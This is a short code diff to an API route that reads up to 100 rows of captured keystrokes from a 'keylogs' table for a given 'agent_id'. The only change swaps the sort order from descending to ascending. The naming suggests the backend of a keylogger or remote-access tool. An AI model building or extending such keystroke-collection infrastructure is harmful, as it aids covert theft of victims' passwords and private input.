@@ -132,7 +132,7 @@ def init_api_routes(app, socketio):
             c.execute('''
                 SELECT keys, timestamp FROM keylogs
                 WHERE agent_id=?
-                ORDER BY timestamp DESC
+                ORDER BY timestamp ASC
                 LIMIT 100
             ''', (agent_id,))
             rows = c.fetchall()
